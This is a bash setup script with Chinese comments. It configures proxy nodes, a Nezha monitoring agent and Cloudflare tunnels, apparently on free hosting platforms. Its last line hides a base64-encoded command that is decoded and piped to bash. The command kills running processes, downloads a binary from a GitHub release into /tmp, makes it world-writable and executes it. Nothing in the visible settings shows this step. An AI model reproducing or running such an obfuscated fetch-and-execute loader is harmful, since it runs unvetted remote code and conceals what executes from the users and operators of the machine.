#!/bin/bash

# 隧道相关设置（去掉下面变量前面#启用，否则使用临时隧道）
export TOK=${TOK:-''}  # token或json,可以直接复制全部，建议使用json，可以免设置端口
export ARGO_DOMAIN=${ARGO_DOMAIN:-''} # 隧道域名

# 哪吒相关设置
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}  # 1启用tls,0关闭tls

# 节点相关设置(节点可在worlds文件里list.log查看)
export TMP_ARGO=${TMP_ARGO:-'hy2'}  # 节点类型,可选vls,vms,spl,rel,hy2,tuic，sock,3x
export UUID=${UUID:-'1a996b5f-f178-4b18-8d7f-ffbd8460c58e'} # 默认随机，去掉#设置固定
export VL_PORT=${VL_PORT:-'8002'} #vles 端口
export VM_PORT=${VM_PORT:-'8001'} #vmes 端口
export CF_IP=${CF_IP:-'ip.sub.dns-dynamic.net'}  # cf优选域名或ip
export SUB_NAME=${SUB_NAME:-'Railway'} # 节点名称
export second_port=${second_port:-''} # 第二端口，部分玩具支持设置第二端口

# 游戏相关设置(去掉#开启游戏，复制启动命令填在下面)，注意开启游戏，不能用rel,tuic,hy2,因为端口会冲突
# export JAR_SH='java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar xxx.jar'  # 游戏启动命令，命令中jar游戏名称改为xxx.jar

# 设置文件保存位置
# export FLIE_PATH="$PWD/worlds/"

# 启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
